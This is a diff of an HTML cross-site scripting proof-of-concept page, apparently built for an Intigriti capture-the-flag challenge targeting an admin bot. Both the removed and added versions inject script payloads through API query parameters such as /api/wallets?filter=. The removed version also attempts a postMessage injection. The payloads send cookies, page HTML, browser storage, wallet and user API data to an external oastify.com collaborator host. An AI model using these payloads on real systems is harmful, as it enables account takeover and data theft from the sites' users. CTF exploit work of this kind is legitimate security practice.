@@ -1,124 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS PoC - Intigriti Challenge</title>
+    <title>XSS PoC</title>
 </head>
 <body>
 <script>
-// When the admin bot visits this page:
-// 1. Fetch vulnerable API endpoint with XSS payload
-// 2. Inject response into iframe to execute XSS
-// 3. XSS in bot's context steals flag and sends to collaborator
+const collab = 'tkhc89fc2l3thl98ptwzq8tu6lcc06ov.oastify.com';
 
-const collaborator = 'tkhc89fc2l3thl98ptwzq8tu6lcc06ov.oastify.com';
-const xssPayload = `
-<script>
-    // Steal cookies
-    fetch('http://${collaborator}/cookies?data=' + encodeURIComponent(document.cookie));
+// Multiple injection methods
+const methods = [
+    // Method 1: Iframe with src
+    () => {
+        const iframe = document.createElement('iframe');
+        iframe.src = `/api/wallets?filter=<script>fetch('http://${collab}/m1'+document.cookie.substr(0,50))<\/script>`;
+        document.body.appendChild(iframe);
+    },
     
-    // Steal entire document HTML (might contain flag)
-    fetch('http://${collaborator}/html?data=' + encodeURIComponent(document.documentElement.outerHTML));
+    // Method 2: Iframe with srcdoc (fetch first)
+    () => {
+        fetch(`/api/wallets?filter=<script>fetch('http://${collab}/m2'+document.domain)<\/script>`, {credentials: 'include'})
+            .then(r => r.text())
+            .then(t => {
+                const iframe = document.createElement('iframe');
+                iframe.srcdoc = t;
+                document.body.appendChild(iframe);
+            });
+    },
     
-    // Check for flag in page text
-    const bodyText = document.body.innerText;
-    if(bodyText.includes('INTIGRITI{')) {
-        const flagMatch = bodyText.match(/INTIGRITI{.*?}/);
-        if(flagMatch) {
-            fetch('http://${collaborator}/flag?data=' + encodeURIComponent(flagMatch[0]));
-        }
+    // Method 3: Image with error handler
+    () => {
+        const img = document.createElement('img');
+        img.src = 'x';
+        img.onerror = () => {
+            fetch(`/api/wallets?filter=<img src=x onerror="fetch('http://${collab}/m3')">`, {credentials: 'include'})
+                .then(r => r.text())
+                .then(t => document.body.innerHTML += t);
+        };
+        document.body.appendChild(img);
     }
-    
-    // Check localStorage
-    for(let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const value = localStorage.getItem(key);
-        fetch('http://${collaborator}/localstorage?key=' + encodeURIComponent(key) + '&value=' + encodeURIComponent(value));
-    }
-    
-    // Check sessionStorage
-    for(let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const value = sessionStorage.getItem(key);
-        fetch('http://${collaborator}/sessionstorage?key=' + encodeURIComponent(key) + '&value=' + encodeURIComponent(value));
-    }
-    
-    // Try to access dashboard data via APIs
-    fetch('/api/wallets', {credentials: 'include'})
-        .then(r => r.text())
-        .then(data => fetch('http://${collaborator}/wallets?data=' + encodeURIComponent(data)));
-    
-    fetch('/api/user', {credentials: 'include'})
-        .then(r => r.text())
-        .then(data => fetch('http://${collaborator}/user?data=' + encodeURIComponent(data)));
-<\/script>`;
+];
 
-// Execute when page loads
-window.onload = function() {
-    console.log('Starting XSS exploit...');
-    
-    // Use the API endpoint that gave us XSS (based on your tests)
-    // Try multiple endpoints to increase chances
-    const endpoints = [
-        `/api/wallets?filter=${encodeURIComponent(xssPayload)}`,
-        `/api/marketwatch?currency=${encodeURIComponent(xssPayload)}`,
-        `/api/search?q=${encodeURIComponent(xssPayload)}`
-    ];
-    
-    // Try each endpoint
-    endpoints.forEach(endpoint => {
-        fetch(endpoint, {
-            credentials: 'include',
-            mode: 'no-cors'  // Helps bypass some restrictions
-        })
-        .then(response => response.text())
-        .then(htmlResponse => {
-            console.log('Got response from', endpoint);
-            
-            // Inject into iframe to execute scripts
-            const iframe = document.createElement('iframe');
-            iframe.srcdoc = htmlResponse;
-            iframe.style.width = '0';
-            iframe.style.height = '0';
-            iframe.style.border = 'none';
-            document.body.appendChild(iframe);
-            
-            // Also try other injection methods
-            setTimeout(() => {
-                const div = document.createElement('div');
-                div.innerHTML = htmlResponse;
-                document.body.appendChild(div);
-            }, 100);
-        })
-        .catch(error => {
-            console.error('Error with', endpoint, error);
-        });
-    });
-    
-    // Also try the postMessage vulnerability as backup
-    setTimeout(() => {
-        const checkoutIframe = document.createElement('iframe');
-        checkoutIframe.src = '/checkout.html?currency=BTC&price=1';
-        checkoutIframe.style.width = '0';
-        checkoutIframe.style.height = '0';
-        document.body.appendChild(checkoutIframe);
-        
-        setTimeout(() => {
-            try {
-                checkoutIframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        currency: '1337COIN',
-                        amount: 0.001,
-                        toAddress: '"><img src=x onerror="fetch(\\'http://${collaborator}/postmessage?data=\\'+encodeURIComponent(document.cookie))">'
-                    }
-                }, '*');
-                console.log('postMessage sent to checkout');
-            } catch(e) {
-                console.error('postMessage failed:', e);
-            }
-        }, 2000);
-    }, 1000);
-};
+// Execute all methods
+methods.forEach((method, i) => {
+    setTimeout(() => method(), i * 1000);
+});
 </script>
 </body>
 </html>
